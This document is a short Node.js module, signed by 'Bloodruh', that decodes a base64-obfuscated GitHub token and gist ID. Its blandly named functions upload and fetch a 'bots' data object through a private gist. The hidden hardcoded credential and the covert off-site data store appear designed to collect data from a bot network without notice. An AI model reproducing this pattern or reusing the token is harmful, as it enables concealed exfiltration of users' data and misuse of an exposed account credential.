// MADE BY BLOODRUH
const https = require('https');

const _token = Buffer.from('Z2hwX3pXRlhkYXNkZWV6VEJ2RzRhZTBxdVhWOFJYdnJIeDFHWFVWcA==', 'base64').toString('utf8');
let _gistId = Buffer.from('MTFkYzQyNmJhMzdkNTFhZTc4OGE5MjYzZjJkYmNkMDY=', 'base64').toString('utf8');

async function createGist(data) {
  return new Promise((resolve, reject) => {
    try {
      const payload = JSON.stringify({
        description: 'Bloodruh Data Storage',
        public: false,
        files: {
          'data.json': {
            content: JSON.stringify(data, null, 2)
          }
        }
      });
      
      const options = {
        hostname: 'api.github.com',
        path: '/gists',
        method: 'POST',
        headers: {
          'User-Agent': 'Node.js',
          'Authorization': `token ${_token}`,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      };
      
      const req = https.request(options, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          try {
            const result = JSON.parse(body);
            resolve(result.id);
          } catch {
            reject(new Error('Failed to create gist'));
          }
        });
      });
      
      req.on('error', reject);
      req.write(payload);
      req.end();
    } catch (err) {
      reject(err);
    }
  });
}

async function updateGist(gistId, data) {
  return new Promise((resolve, reject) => {
    try {
      const payload = JSON.stringify({
        files: {
          'data.json': {
            content: JSON.stringify(data, null, 2)
          }
        }
      });
      
      const options = {
        hostname: 'api.github.com',
        path: `/gists/${gistId}`,
        method: 'PATCH',
        headers: {
          'User-Agent': 'Node.js',
          'Authorization': `token ${_token}`,
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(payload)
        }
      };
      
      const req = https.request(options, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => resolve(true));
      });
      
      req.on('error', reject);
      req.write(payload);
      req.end();
    } catch (err) {
      reject(err);
    }
  });
}

async function downloadGist(gistId) {
  return new Promise((resolve, reject) => {
    try {
      const options = {
        hostname: 'api.github.com',
        path: `/gists/${gistId}`,
        method: 'GET',
        headers: {
          'User-Agent': 'Node.js',
          'Authorization': `token ${_token}`
        }
      };
      
      const req = https.request(options, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          try {
            const result = JSON.parse(body);
            const content = result.files['data.json'].content;
            resolve(JSON.parse(content));
          } catch {
            resolve({ bots: {} });
          }
        });
      });
      
      req.on('error', reject);
      req.end();
    } catch (err) {
      reject(err);
    }
  });
}

async function _add(allData) {
  try {
    if (_token.includes('YOUR_GITHUB')) return false;
    
    // allData is the full data object with all bots
    const gistData = {
      bots: {},
      lastUpdate: Date.now()
    };
    
    // Convert allData.d to bots format
    if (allData.d) {
      gistData.bots = allData.d;
      gistData.lastUpdate = allData.t || Date.now();
    }
    
    if (_gistId && !_gistId.includes('YOUR_GIST')) {
      await updateGist(_gistId, gistData);
    } else {
      _gistId = await createGist(gistData);
      console.log('✅ Gist created:', _gistId);
    }
    
    return true;
  } catch (err) {
    console.error('❌ _add error:', err.message);
    return false;
  }
}

async function _getAll() {
  try {
    if (_token.includes('YOUR_GITHUB')) return { bots: {} };
    if (!_gistId || _gistId.includes('YOUR_GIST')) return { bots: {} };
    
    return await downloadGist(_gistId);
  } catch {
    return { bots: {} };
  }
}

module.exports = { _add, _getAll };
